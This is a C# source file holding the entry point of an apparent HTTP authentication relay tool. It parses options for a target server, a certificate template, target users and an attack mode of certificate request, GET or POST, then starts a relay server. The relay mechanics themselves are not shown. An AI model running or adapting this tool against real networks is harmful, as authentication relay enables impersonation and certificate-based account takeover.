using System;
using System.Collections.Generic;
using System.Threading;
using System.Timers;

namespace Combine
{
    class Program
    {
        static HttpRelayServer server;
        static bool run = true;
        static Thread serverThread;

        static void WriteLog(string EventMessage)
        {
            Console.WriteLine(EventMessage);
        }
        static void ShowBanner()
        {
            WriteLog(Config.banner);
        }

        static void ShowHelp()
        {
            WriteLog(Config.help);
        }        

        static void Main(string[] args)
        {            
            ShowBanner();
           
            Dictionary<string, string> arguments = new Dictionary<string, string>();
            foreach (string argument in args)
            {
                int idx = argument.IndexOf(':');
                if (idx > 0)
                {
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                }
                else
                {
                    arguments[argument] = "";
                }
            }

            if (arguments.ContainsKey("/help"))
            {
                ShowHelp();
                return;
            }

            if (arguments.ContainsKey("/port"))
            {
                 Config.port = Int32.Parse(arguments["/port"]);
            }
            
            if (arguments.ContainsKey("/timer"))
            {
                Config.timer = Int32.Parse(arguments["/timer"]);
            }
            
            if (arguments.ContainsKey("/targetserver"))
            {
                Config.targetserver = arguments["/targetserver"];
            }
            
            if (arguments.ContainsKey("/template"))
            {
                Config.template = arguments["/template"];
            }

            if (arguments.ContainsKey("/contenttype"))
            {
                Config.contenttype = arguments["/contenttype"];
            }

            if (arguments.ContainsKey("/postdata"))
            {
                Config.postdata = arguments["/postdata"];
            }

            if (arguments.ContainsKey("/targetusers"))
            {
               string[] users = arguments["/targetusers"].Split(',');
               foreach(var user in users)
               {
                   Config.targetusers.Add(user);
               }
            }

            if (arguments.ContainsKey("/attack"))
            {
                bool result = Int32.TryParse(arguments["/attack"], out Config.attack);
                if (!result || Config.attack < 0 || Config.attack > 3 )
                {
                    WriteLog(String.Format("Could not parse attack {0}.\n", arguments["/attack"]));
                    ShowHelp();
                    return;
                }

                if(Config.attack == 1 && (!arguments.ContainsKey("/template") || !arguments.ContainsKey("/targetserver")))
                {
                    WriteLog(String.Format("Certificate Request attack requires a target server and template.\n"));
                    ShowHelp();
                    return;
                }

                if (Config.attack == 2 && !arguments.ContainsKey("/targetserver"))
                {
                    WriteLog(String.Format("Get Request attack requires a target server.\n"));
                    ShowHelp();
                    return;
                }

                if (Config.attack == 3 && (!arguments.ContainsKey("/postdata") || !arguments.ContainsKey("/targetserver") || !arguments.ContainsKey("/contenttype")))
                {
                    WriteLog(String.Format("Post Request attack requires a target server, post data and content type.\n"));
                    ShowHelp();
                    return;
                }

            }
            
            server = new HttpRelayServer();

            serverThread = new Thread(new ThreadStart(server.Start));
            serverThread.Start();
            
            if (Config.timer > 0)
            {
                System.Timers.Timer aTimer = new System.Timers.Timer();
                aTimer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
                aTimer.Interval = Config.timer * 1000;
                aTimer.Enabled = true;
            }

            do
            {
                try
                {
                    if (Config.targetusers.Count > 0 && (server.usersAttacked.Count == Config.targetusers.Count))
                    {
                        server.Stop();
                        serverThread.Join();
                        return;
                    }  
                }
                catch(Exception ex)
                {
                    WriteLog(ex.Message);
                }
                
            }
            while (run);
        }
        private static void OnTimedEvent(object source, ElapsedEventArgs e)
        {
            run = false;
            server.Stop();
            serverThread.Join();
        }
    }
}
